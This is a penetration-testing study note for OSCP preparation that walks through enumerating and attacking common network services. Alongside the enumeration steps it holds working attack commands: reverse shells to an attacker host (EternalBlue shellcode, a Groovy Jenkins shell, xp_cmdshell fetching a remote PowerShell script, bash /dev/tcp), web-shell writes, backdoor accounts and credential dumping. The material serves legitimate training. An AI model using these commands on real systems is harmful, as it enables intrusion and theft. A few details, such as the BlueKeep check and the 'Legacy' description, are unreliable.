---
tags: [oscp-journey, spectre, stage-1, service-enumeration, smb, ftp, ssh, snmp, mssql, mysql]
module: 1
cert-stage: thm
difficulty: beginner
date: 2026-04-08
phantom-refs: ["PHANTOM/MODULE 3 — Network Pentesting/03.1"]
netgod-refs: ["Networking/Module-03-Protocols-Deep-Dive"]
---

# S1-13 — Service Enumeration Deep Dive

## Why Service Enumeration Wins Boxes

After Nmap tells you what ports are open, your job is to extract maximum information from each service before attempting exploitation. Thorough enumeration means you know exactly what's running, what version it is, what it allows, and what's been misconfigured — before you write a single exploit command.

The rule: **never skip a port**. The unusual service on port 8888 or 31337 is often the intended attack path.

---

## FTP (Port 21)

### What FTP Is

File Transfer Protocol — a cleartext file transfer service. Commands and data (including credentials) flow in plaintext. Two channels: control (port 21) and data (port 20 active, or ephemeral port in passive mode).

### Enumeration Checklist

**Banner grabbing:**
```bash
nc -nv TARGET 21
ftp TARGET
# Read the banner — version number is right there
# Banner example: 220 ProFTPD 1.3.5 Server
```

**Anonymous login — always test this first:**
```bash
ftp TARGET
# Username: anonymous
# Password: anything (try anonymous, blank, or your@email.com)

# If logged in:
ls -la                    # List all files including hidden
get filename              # Download a file
mget *                    # Download all files
put shell.php             # Upload (if writable — this is gold)
```

**Automated anonymous login test:**
```bash
nmap --script ftp-anon -p21 TARGET
```

**Recursive download of everything (anonymous):**
```bash
wget -m --no-passive ftp://anonymous:anonymous@TARGET
wget -r ftp://anonymous:anonymous@TARGET/
```

**Version CVE research:**
```bash
searchsploit proftpd 1.3.5
searchsploit vsftpd 2.3.4       # Famous backdoor — gives instant shell
searchsploit filezilla
```

**vsftpd 2.3.4 Backdoor (CVE-2011-2523):**
This version has a deliberately planted backdoor — if you log in with a username containing `:)`, a root bind shell opens on port 6200:
```bash
# Method 1 — Metasploit:
use exploit/unix/ftp/vsftpd_234_backdoor

# Method 2 — Manual:
nc TARGET 21
USER backdoor:)
PASS anything
# Then in separate terminal:
nc TARGET 6200    # Root shell
```

**Writable FTP directory → RCE:**
If FTP is writable and you know the web root path:
```bash
ftp TARGET
put shell.php              # Upload PHP shell to FTP
# Access via: http://TARGET/shell.php?cmd=id
```

**Brute force:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET -t 10
medusa -h TARGET -u admin -P rockyou.txt -M ftp -t 10
```

### Key Commands Summary
```bash
ftp TARGET                          # Connect interactively
nc TARGET 21                        # Banner grab
nmap --script ftp-anon -p21 TARGET  # Test anonymous
nmap --script ftp-brute -p21 TARGET # Brute force (slow)
wget -m ftp://anonymous:@TARGET     # Recursive download
searchsploit vsftpd                 # Version CVE lookup
```

---

## SSH (Port 22)

### What SSH Is

Secure Shell — encrypted remote terminal access. Replaces Telnet. Uses public-key cryptography for both host verification and optionally user authentication.

### Enumeration Checklist

**Banner and version:**
```bash
nc -nv TARGET 22
ssh -v TARGET               # Verbose — shows key exchange, server version
# Example banner: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
```

**Supported authentication methods:**
```bash
nmap --script ssh-auth-methods -p22 TARGET
# Look for: publickey, password, keyboard-interactive
# If "password" is listed, brute force is possible
# If ONLY "publickey", brute force won't work
```

**Username enumeration (CVE-2018-15473 — OpenSSH < 7.7):**
Older OpenSSH versions respond differently to valid vs invalid usernames during key negotiation:
```bash
# Exploit:
searchsploit openssh 7.7
searchsploit -m exploits/linux/remote/45233.py
python3 45233.py TARGET 22 -u root        # Valid user
python3 45233.py TARGET 22 -u fakeuser    # Invalid user — different response time

# Or use the dedicated tool:
python3 ssh_user_enum.py --port 22 --userList users.txt TARGET
```

**Private key cracking:**
If you find a password-protected `id_rsa` key (on the target, in a backup, in a web directory):
```bash
# Convert to John format:
ssh2john id_rsa > id_rsa.hash

# Crack:
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 22911 id_rsa.hash rockyou.txt   # OpenSSH private key format

# Once cracked, use the key:
chmod 600 id_rsa
ssh -i id_rsa user@TARGET
```

**Weak SSH key detection (Debian DSA keys — CVE-2008-0166):**
Debian/Ubuntu systems generated predictable SSH keys from 2006-2008. Only 32,767 possible key pairs:
```bash
# Download known weak keys:
git clone https://github.com/g0tmi1k/debian-ssh
ls debian-ssh/common_keys/
# Try each key:
for key in debian-ssh/common_keys/*.pub; do
    ssh -i "${key%.pub}" user@TARGET -o StrictHostKeyChecking=no 2>/dev/null
done
```

**Brute force:**
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET -t 4
medusa -h TARGET -u root -P rockyou.txt -M ssh -t 4
```

**SSH port forwarding (local — covered fully in S2-02):**
```bash
ssh -L LPORT:TARGET_INTERNAL:RPORT user@PIVOT_HOST   # Local forward
ssh -D 9050 user@PIVOT_HOST                          # Dynamic SOCKS proxy
ssh -R RPORT:localhost:LPORT user@REMOTE_HOST         # Reverse tunnel
```

**Shellshock via SSH (legacy bash on old systems):**
```bash
ssh user@TARGET '() { :;}; /bin/bash -i'
# If bash < 4.3 and ForceCommand is set in sshd_config
```

### Key Commands Summary
```bash
nc TARGET 22                                    # Banner grab
ssh -v user@TARGET                              # Verbose connect + version
nmap --script ssh-auth-methods -p22 TARGET      # Auth methods
ssh2john id_rsa > hash && john hash             # Crack private key
hydra -l root -P rockyou.txt ssh://TARGET -t 4  # Brute force
ssh -i id_rsa user@TARGET                       # Connect with key
ssh -L 8080:INTERNAL:80 user@PIVOT              # Port forward
```

---

## Telnet (Port 23)

### What Telnet Is

Legacy remote terminal — completely cleartext. Every keystroke and response is visible in plaintext on the wire. Occasionally still found on embedded devices, old network hardware, and legacy systems.

**Connect and banner grab:**
```bash
telnet TARGET
telnet TARGET 23
nc TARGET 23                    # Same thing
```

**What to do when connected:**
- Try default credentials (see S1-12 default creds table)
- Try blank username/password
- Try `admin`, `root`, `cisco`, `administrator`

**Brute force:**
```bash
hydra -l admin -P rockyou.txt telnet://TARGET -t 4
medusa -h TARGET -u admin -P rockyou.txt -M telnet
```

---

## SMTP (Ports 25, 465, 587)

### What SMTP Is

Simple Mail Transfer Protocol — sends email between servers. Port 25 (server-to-server), 465 (SMTPS — deprecated), 587 (submission with auth).

### Enumeration Checklist

**Banner grab:**
```bash
nc -nv TARGET 25
telnet TARGET 25
# Banner: 220 mailserver.domain.com ESMTP Postfix
```

**Manual SMTP conversation:**
```bash
nc TARGET 25
EHLO test.domain.com         # Hello — server responds with supported extensions
VRFY root                    # Does this user exist?
VRFY admin@domain.com
EXPN admins                  # Expand mailing list — reveals members
RCPT TO:root@localhost        # Alternative user enum if VRFY is disabled
QUIT
```

**Response codes:**
| Code | Meaning |
|------|---------|
| `250` | User exists |
| `252` | Cannot verify but will try (user likely exists) |
| `550` | User does not exist |
| `503` | Command disabled |

**smtp-user-enum tool:**
```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t TARGET
smtp-user-enum -M RCPT -U users.txt -t TARGET
smtp-user-enum -M EXPN -U users.txt -t TARGET
```

**Nmap scripts:**
```bash
nmap --script smtp-enum-users -p25 TARGET
nmap --script smtp-open-relay -p25 TARGET    # Check if open relay (can send email as anyone)
nmap --script smtp-commands -p25 TARGET      # List supported commands
```

**Open relay abuse (if detected):**
An open relay will forward email for any sender to any recipient — useful for phishing in real engagements, or finding internal email addresses during recon.

---

## DNS (Port 53)

### See S1-04 for Full DNS Coverage

Key commands specific to enumeration:

```bash
# Zone transfer:
dig axfr @TARGET domain.local
host -l domain.local TARGET

# Reverse lookup entire subnet:
for i in $(seq 1 254); do host 192.168.1.$i TARGET 2>/dev/null | grep -v "NXDOMAIN"; done

# Subdomain brute force:
dnsrecon -d domain.com -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt
gobuster dns -d domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r TARGET

# SRV records (AD):
dig SRV _kerberos._tcp.domain.local @TARGET
dig SRV _ldap._tcp.domain.local @TARGET
```

---

## HTTP/HTTPS (Ports 80, 443, 8080, 8443)

### Technology Fingerprinting

Before attacking, know what you're dealing with:

**Wappalyzer (browser extension):** Detects frameworks, CMS, server software automatically.

**whatweb (CLI):**
```bash
whatweb http://TARGET
whatweb -a 3 http://TARGET        # More aggressive
whatweb http://TARGET -v          # Verbose output
```

**curl for headers:**
```bash
curl -I http://TARGET              # HTTP HEAD request — shows server headers
curl -IL http://TARGET             # Follow redirects
curl -I https://TARGET -k          # HTTPS with self-signed cert
# Look for: Server: Apache/2.4.49, X-Powered-By: PHP/7.4.3
```

**robots.txt and sitemap.xml:**
```bash
curl http://TARGET/robots.txt      # Often reveals admin paths
curl http://TARGET/sitemap.xml     # Site structure
curl http://TARGET/.git/HEAD       # Git repository exposed?
curl http://TARGET/.env            # Environment file (creds)
```

**SSL certificate inspection (HTTPS):**
```bash
openssl s_client -connect TARGET:443 | openssl x509 -noout -text
# Look for: Subject, SAN (alternative names) — reveals internal hostnames
echo | openssl s_client -connect TARGET:443 2>/dev/null | openssl x509 -noout -subject -altnames
```

**Full web enumeration workflow:**
```bash
# 1. Fingerprint:
whatweb http://TARGET

# 2. Check standard files:
curl http://TARGET/robots.txt
curl http://TARGET/sitemap.xml

# 3. Directory brute force:
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50

# 4. Nikto scan (noisy but thorough):
nikto -h http://TARGET

# 5. VHost enumeration (if applicable):
ffuf -u http://TARGET -H "Host: FUZZ.domain.htb" -w subdomains.txt -fs BASELINE
```

---

## SMB (Ports 139, 445)

### What SMB Is and Why It's Critical

Server Message Block — Windows file sharing, printer sharing, and authentication protocol. It's the backbone of Windows networking and has a history of catastrophic vulnerabilities (EternalBlue, MS08-067). Almost every Windows OSCP machine has SMB.

### Null Session Enumeration (No Credentials)

```bash
# List shares anonymously:
smbclient -L //TARGET -N           # -N = no password
smbmap -H TARGET                   # Check share permissions
smbmap -H TARGET -u ''             # Explicit null user
enum4linux -a TARGET               # Comprehensive enumeration (null session)
enum4linux-ng TARGET               # Newer version, better output

# What enum4linux reveals:
# - OS version and domain info
# - Users and groups
# - Shares and permissions
# - Password policy
# - RID cycling (enumerate users by RID)
```

**CrackMapExec null session:**
```bash
crackmapexec smb TARGET            # Basic info (OS, name, signing)
crackmapexec smb TARGET -u '' -p ''  # Null session shares
crackmapexec smb TARGET -u '' -p '' --shares
crackmapexec smb TARGET -u '' -p '' --users
crackmapexec smb TARGET -u '' -p '' --groups
```

### Listing and Connecting to Shares

```bash
# List shares:
smbclient -L //TARGET -N
smbmap -H TARGET
smbmap -H TARGET -u validuser -p validpass

# Connect to a share:
smbclient //TARGET/SHARENAME -N          # No creds
smbclient //TARGET/SHARENAME -U user     # Prompts for password
smbclient //TARGET/SHARENAME -U user%pass

# Inside smbclient:
ls                    # List files
get filename          # Download file
put localfile         # Upload file
cd directory          # Change directory
recurse ON            # Enable recursion
prompt OFF            # Disable prompts
mget *                # Download everything recursively
```

**Recursive download with smbget:**
```bash
smbget -R smb://TARGET/SHARENAME -U user%pass
smbget -R smb://TARGET/SHARENAME --no-pass   # Anonymous
```

**Mount SMB share:**
```bash
sudo mkdir /mnt/smb
sudo mount -t cifs //TARGET/SHARENAME /mnt/smb -o username=user,password=pass
sudo mount -t cifs //TARGET/SHARENAME /mnt/smb -o guest     # Anonymous
ls /mnt/smb
```

### SMB Vulnerability Scanning

```bash
# EternalBlue (MS17-010):
nmap --script smb-vuln-ms17-010 -p445 TARGET

# All SMB vuln scripts:
nmap --script "smb-vuln-*" -p445 TARGET

# SMB signing (required for relay attacks):
nmap --script smb2-security-mode -p445 TARGET
crackmapexec smb TARGET --gen-relay-list relay_targets.txt
# If signing "not required" → target is vulnerable to SMB relay
```

### EternalBlue (MS17-010) — Manual Exploitation Without Metasploit

```bash
# Download manual exploit:
git clone https://github.com/worawit/MS17-010
cd MS17-010

# Install dependencies:
pip install impacket

# Check vulnerability:
python checker.py TARGET

# Set up listener:
nc -lvnp 4444 &

# Generate shellcode:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
  -f raw -o shellcode.bin

# Exploit:
python zzz_exploit.py TARGET    # Gives SYSTEM shell on 2008/7
# or
python eternalblue_exploit7.py TARGET shellcode.bin
```

**Metasploit version (uses your 1 allowed module):**
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET
set LHOST tun0
run
```

### CrackMapExec with Valid Credentials

```bash
crackmapexec smb TARGET -u user -p password --shares
crackmapexec smb TARGET -u user -p password --users
crackmapexec smb TARGET -u user -p password --groups
crackmapexec smb TARGET -u user -p password --pass-pol
crackmapexec smb TARGET -u user -p password --sam        # Dump local SAM hashes (admin needed)
crackmapexec smb TARGET -u user -p password --lsa        # Dump LSA secrets
crackmapexec smb TARGET -u user -p password -x "whoami"  # Execute command via SMB
```

**Pass-the-Hash with CME:**
```bash
crackmapexec smb TARGET -u admin -H NTLM_HASH --local-auth
crackmapexec smb 192.168.1.0/24 -u admin -H NTLM_HASH --local-auth --continue-on-success
```

### Key Commands Summary
```bash
smbclient -L //TARGET -N                            # List shares anon
smbmap -H TARGET                                     # Share permissions
enum4linux-ng TARGET                                 # Full enum
nmap --script smb-vuln-ms17-010 -p445 TARGET         # EternalBlue check
nmap --script smb2-security-mode -p445 TARGET         # Signing check
crackmapexec smb TARGET -u user -p pass --shares     # Authenticated share list
smbclient //TARGET/share -U user%pass                # Connect to share
```

---

## SNMP (Port 161 UDP)

### What SNMP Is

Simple Network Management Protocol — used to monitor and manage network devices. Agents on devices expose a Management Information Base (MIB) tree of system information. SNMP v1/v2c use **community strings** as passwords — transmitted in plaintext.

### Why SNMP is Valuable for Pentesters

An SNMP service with the default community string `public` exposes:
- System hostname, OS version, uptime
- Network interfaces and IP addresses
- Running processes (often includes command-line arguments — credentials in plaintext)
- Installed software
- User accounts
- Mounted filesystems
- Open TCP connections

### Enumeration

**Community string brute force:**
```bash
# onesixtyone — fast SNMP community string brute forcer:
onesixtyone TARGET public
onesixtyone TARGET private
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt TARGET

# Nmap brute force:
nmap --script snmp-brute -sU -p161 TARGET
```

**snmpwalk — dump entire MIB tree:**
```bash
# SNMP v2c with community string "public":
snmpwalk -v2c -c public TARGET

# Get specific OID:
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.4.2.1.2   # Running processes
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.6.3.1.2   # Installed software
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.2.2.1.11     # Network interfaces
snmpwalk -v2c -c public TARGET 1.3.6.1.4.1.77.1.2.25    # Windows user accounts
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.6.13.1.3     # Open TCP ports
```

**High-value OIDs — what to always check:**

| OID | What it reveals |
|-----|----------------|
| `1.3.6.1.2.1.1` | System info (hostname, description, uptime) |
| `1.3.6.1.2.1.25.4.2.1.2` | Running processes |
| `1.3.6.1.2.1.25.4.2.1.5` | Process parameters (command-line args — may contain passwords) |
| `1.3.6.1.2.1.25.6.3.1.2` | Installed software |
| `1.3.6.1.2.1.2.2.1.2` | Network interface names |
| `1.3.6.1.4.1.77.1.2.25` | Windows user accounts |
| `1.3.6.1.2.1.6.13.1.3` | Listening TCP ports |
| `1.3.6.1.2.1.4.20.1.1` | IP addresses assigned to interfaces |

**snmp-check (more readable output):**
```bash
snmp-check TARGET -c public
snmp-check TARGET -c public -v 2c
```

**snmpbulkwalk (faster than snmpwalk):**
```bash
snmpbulkwalk -Oa -v2c -c public TARGET > snmp_output.txt
```

**Decoding MIB output:**
Raw OID output can be cryptic. Install MIB files for human-readable names:
```bash
sudo apt install snmp-mibs-downloader
sudo download-mibs
# Edit /etc/snmp/snmp.conf — comment out "mibs :"
snmpwalk -v2c -c public -m ALL TARGET
```

**SNMP v3 — encrypted and authenticated:**
```bash
# If v3 is in use, you need credentials:
snmpwalk -v3 -l authPriv -u username -a SHA -A authpass -x AES -X privpass TARGET
```

**SNMP write access (RW community string):**
If you find a read-write community string, you can modify device configuration:
```bash
snmpset -v2c -c private TARGET OID TYPE VALUE
# Example: change sysName
snmpset -v2c -c private TARGET 1.3.6.1.2.1.1.5.0 s "newname"
```

---

## MySQL (Port 3306) and MSSQL (Port 1433)

### MySQL

**Connect:**
```bash
mysql -h TARGET -u root -p              # Prompts for password
mysql -h TARGET -u root                 # Try blank password
mysql -h TARGET -u root -p''            # Explicit blank

# From Metasploit auxiliary:
use auxiliary/scanner/mysql/mysql_login
```

**Nmap scripts:**
```bash
nmap --script mysql-empty-password -p3306 TARGET   # Test blank root
nmap --script mysql-info -p3306 TARGET             # Version and status info
nmap --script mysql-databases -p3306 --script-args mysqluser=root TARGET
```

**Once connected — enumeration:**
```sql
show databases;                          -- List all databases
use mysql;                               -- Switch to mysql DB
show tables;
select user, password, host from user;   -- User hashes (older MySQL)
select user, authentication_string, host from user;  -- Modern MySQL

-- Create backdoor user (if you have root):
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'password123';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';
FLUSH PRIVILEGES;

-- File read:
SELECT LOAD_FILE('/etc/passwd');

-- File write (web shell):
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

**UDF (User Defined Functions) — MySQL RCE:**
On some MySQL configs, you can create a UDF from a shared library that executes OS commands:
```bash
# Download MySQL UDF exploit:
searchsploit "mysql udf"
# Compile, upload to MySQL plugin dir, then:
# CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
# SELECT sys_exec('bash -i >& /dev/tcp/IP/PORT 0>&1');
```

### MSSQL

**Connect with impacket:**
```bash
impacket-mssqlclient domain/user:password@TARGET
impacket-mssqlclient user:password@TARGET -windows-auth   # Windows auth
impacket-mssqlclient user@TARGET                           # Prompts for password
```

**Connect with sqsh:**
```bash
sqsh -S TARGET -U sa -P password -D database
```

**Nmap scripts:**
```bash
nmap --script ms-sql-info -p1433 TARGET
nmap --script ms-sql-empty-password -p1433 TARGET      # Test blank SA
nmap --script ms-sql-config -p1433 TARGET
nmap --script ms-sql-tables -p1433 TARGET
```

**Once connected — enumeration:**
```sql
SELECT @@version;                        -- MSSQL version
SELECT name FROM sys.databases;          -- List databases
USE database_name;
SELECT * FROM INFORMATION_SCHEMA.TABLES; -- List tables
SELECT * FROM users;                     -- Dump table

-- Check if xp_cmdshell is enabled:
EXEC xp_cmdshell 'whoami';              -- If this works, immediate RCE
-- If disabled, enable it:
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Get a reverse shell via xp_cmdshell:
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER/shell.ps1'')"';

-- Check linked servers (can pivot to other SQL servers):
EXEC sp_linkedservers;
EXEC ('SELECT @@version') AT linkedserver;

-- Read files (MSSQL):
EXEC xp_cmdshell 'type C:\Windows\win.ini';
```

**Metasploit MSSQL modules (auxiliary — counts as your 1 use):**
```
auxiliary/scanner/mssql/mssql_login
auxiliary/admin/mssql/mssql_exec
exploit/windows/mssql/mssql_payload
```

---

## RDP (Port 3389)

### Enumeration

```bash
nmap --script rdp-enum-encryption -p3389 TARGET
nmap --script rdp-vuln-ms12-020 -p3389 TARGET

# Check for BlueKeep (CVE-2019-0708 — Windows 7/Server 2008):
nmap --script rdp-vuln-ms12-020 -p3389 TARGET
# Metasploit: use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

### Connecting

```bash
# xfreerdp (preferred — more features):
xfreerdp /u:username /p:password /v:TARGET
xfreerdp /u:username /p:password /v:TARGET /cert-ignore   # Self-signed cert
xfreerdp /u:administrator /p:'' /v:TARGET                 # Blank password
xfreerdp /u:username /d:DOMAIN /p:password /v:TARGET      # Domain auth
xfreerdp /u:username /p:password /v:TARGET /drive:share,/tmp  # Share local folder

# rdesktop (older):
rdesktop -u username -p password TARGET

# Pass-the-Hash to RDP (requires restricted admin mode):
xfreerdp /u:administrator /pth:NTLM_HASH /v:TARGET
```

### Brute Force

```bash
hydra -l administrator -P rockyou.txt rdp://TARGET -t 4
crowbar -b rdp -s TARGET/32 -u administrator -C rockyou.txt -n 4
```

---

## WinRM (Ports 5985, 5986)

### What WinRM Is

Windows Remote Management — Microsoft's implementation of WS-Management protocol. Allows remote PowerShell sessions. Port 5985 = HTTP, 5986 = HTTPS.

**Evil-WinRM — the standard attack tool:**
```bash
# Connect with password:
evil-winrm -i TARGET -u username -p password

# Connect with NTLM hash (Pass-the-Hash):
evil-winrm -i TARGET -u username -H NTLM_HASH

# Connect with SSL (port 5986):
evil-winrm -i TARGET -u username -p password -S

# Upload file to target:
evil-winrm -i TARGET -u username -p password
# Inside session:
upload /local/path/tool.exe
download C:\remote\file.txt

# Load PowerShell scripts:
evil-winrm -i TARGET -u username -p password -s /path/to/ps1_scripts/
```

**CrackMapExec WinRM:**
```bash
crackmapexec winrm TARGET -u user -p password
crackmapexec winrm TARGET -u user -H HASH
crackmapexec winrm TARGET -u user -p password -x "whoami"
```

---

## Tomcat (Ports 8080, 8443)

### Finding the Manager Application

```bash
gobuster dir -u http://TARGET:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt
# Look for: /manager/html, /manager/status, /host-manager/html
```

**Default Tomcat credentials to try:**
```
admin:admin
admin:password
tomcat:tomcat
tomcat:s3cret
admin:s3cret
admin:tomcat
root:root
manager:manager
```

**Hydra against Tomcat Manager (HTTP Basic Auth):**
```bash
hydra -L users.txt -P passwords.txt TARGET http-get /manager/html -s 8080
```

### WAR File Deployment → RCE

Once you have valid Tomcat Manager credentials:

**Method 1 — msfvenom WAR + curl:**
```bash
# Generate WAR payload:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war -o shell.war

# Start listener:
nc -lvnp 4444

# Deploy via curl:
curl -u 'tomcat:s3cret' http://TARGET:8080/manager/text/deploy?path=/shell --upload-file shell.war

# Trigger:
curl http://TARGET:8080/shell/
```

**Method 2 — Manual deployment via browser:**
1. Browse to `http://TARGET:8080/manager/html`
2. Login with valid creds
3. Scroll to "WAR file to deploy" section
4. Upload `shell.war`
5. Click "Deploy"
6. Click the `/shell` link in the applications list

**Method 3 — Metasploit:**
```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS TARGET
set RPORT 8080
set HttpUsername tomcat
set HttpPassword s3cret
set LHOST tun0
run
```

---

## Jenkins

### Finding Jenkins

Jenkins typically runs on port 8080 or 8443. Check for unauthenticated dashboard access.

```bash
curl http://TARGET:8080/                    # Check if Jenkins is running
curl http://TARGET:8080/api/json            # API endpoint — reveals version
gobuster dir -u http://TARGET:8080 -w common.txt
```

### Script Console RCE (Groovy)

If you can access the Script Console (Manage Jenkins → Script Console), you have instant RCE:

```groovy
// Execute OS command:
def cmd = "id".execute()
println cmd.text

// Reverse shell:
String host = "ATTACKER_IP";
int port = 4444;
String cmd2 = "bash";
Process p = new ProcessBuilder(cmd2).redirectErrorStream(true).start();
Socket s = new Socket(host, port);
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}
```

**Credential extraction from Jenkins:**
```bash
# Jenkins stores credentials in:
# /var/jenkins_home/credentials.xml
# /var/jenkins_home/secrets/
# Use Script Console to read:
println(new File('/var/jenkins_home/credentials.xml').text)
```

---

## Quick Reference — All Services

| Service | Port | First Commands |
|---------|------|---------------|
| FTP | 21 | `ftp TARGET` → anonymous login; `nmap --script ftp-anon` |
| SSH | 22 | `nc TARGET 22` → banner; `hydra -l root -P rockyou.txt ssh://TARGET -t 4` |
| Telnet | 23 | `telnet TARGET` → default creds |
| SMTP | 25 | `nc TARGET 25` → VRFY/EXPN; `smtp-user-enum -M VRFY -U users.txt -t TARGET` |
| DNS | 53 | `dig axfr @TARGET domain.local`; subdomain brute force |
| HTTP | 80 | `whatweb`, `gobuster dir`, `nikto -h TARGET` |
| SMB | 445 | `smbmap -H TARGET`; `enum4linux-ng TARGET`; `nmap --script smb-vuln-ms17-010` |
| SNMP | 161/UDP | `onesixtyone TARGET public`; `snmpwalk -v2c -c public TARGET` |
| MSSQL | 1433 | `impacket-mssqlclient user:pass@TARGET`; `nmap --script ms-sql-empty-password` |
| MySQL | 3306 | `mysql -h TARGET -u root -p`; `nmap --script mysql-empty-password` |
| RDP | 3389 | `xfreerdp /u:user /p:pass /v:TARGET`; `nmap --script rdp-enum-encryption` |
| WinRM | 5985 | `evil-winrm -i TARGET -u user -p pass` |
| Tomcat | 8080 | Browse `/manager/html`; default creds; WAR deploy |
| Jenkins | 8080 | Browse `/script`; Groovy console RCE |

---

## Common Mistakes

> [!warning] Service enumeration mistakes that cost machines
> 1. **Not testing FTP anonymous login.** It takes 10 seconds and reveals readable files constantly on OSCP machines.
> 2. **Skipping SNMP UDP 161.** SNMP with default community string `public` has revealed process command-line arguments containing passwords on multiple OSCP machines.
> 3. **Not trying blank MySQL root password.** Many OSCP MySQL installs have no root password. `mysql -h TARGET -u root` with no password check takes 5 seconds.
> 4. **Not checking SMB signing before attempting relay.** Relay attacks fail if signing is required. Check first with `nmap --script smb2-security-mode`.
> 5. **Missing Tomcat manager at non-standard paths.** Sometimes `/manager` is renamed. Always run gobuster against all web ports.
> 6. **Not running enum4linux on every SMB target.** Even if shares look empty, enum4linux reveals users, groups, and password policy — critical for password spraying.

---

## Practice Resources

| Resource | What to do |
|----------|-----------|
| TryHackMe — "Network Services" rooms | FTP, NFS, SMB, Telnet, MySQL labs |
| TryHackMe — "Network Services 2" | SMTP, RDP, SNMP labs |
| HTB — Lame | Samba CVE via SMB — first Linux machine most people root |
| HTB — Blue | EternalBlue on Windows 7 |
| HTB — Legacy | MS08-067 MSSQL via SMB |
| HTB — Bastard | IIS + Drupal — HTTP enumeration |
| HTB — Arctic | ColdFusion — HTTP alternative service |
| HTB — Jerry | Tomcat WAR deploy |
| [[PHANTOM/MODULE 3 — Network Pentesting/03.1]] | Full protocol attack details in PHANTOM |
